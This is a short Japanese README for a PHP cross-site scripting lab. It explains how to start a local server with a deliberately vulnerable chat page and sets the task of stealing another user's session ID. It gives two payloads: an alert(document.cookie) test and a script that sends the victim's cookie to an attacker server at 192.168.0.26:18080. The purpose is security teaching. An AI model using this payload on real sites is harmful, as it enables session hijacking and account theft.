# PHP XSS

XSSの課題サンプルです。


## 準備

ブラウザのCookieを確認できるように、Chromeに以下のプラグインをインストールしておきます。

### Chrome Edit This Cookieプラグイン

https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=ja

## 動作確認

ローカルでサーバを起動しておきます。

```
cd xss
php -S localhost:8000
```


以下のURLにアクセスします。

http://localhost8000/index.php

ボタンを押すと数字が増えます。

> ここでセッション情報を作成しています。


続いてログインして、チャットページにアクセスします。

http://localhost8000/login.php

> chat.phpには脆弱性があります。


## セキュリティ課題：他のユーザのSESSION IDを取得するには

### 不正なコード1

```
<script>alert(document.cookie)</script>
```

### 不正なコード2

```
<script>const s = document.createElement("script"); s.src="http://192.168.0.26:18080/?cookie=" + document.cookie;document.querySelector("head").append(s);</script>
```

> ここではネットワーク上に、192.168.0.26:18080でWebサーバが起動するものとしています。サーバのアクセスログに利用者のセッションIDが表示されるでしょう。URLの部分は調整してください。
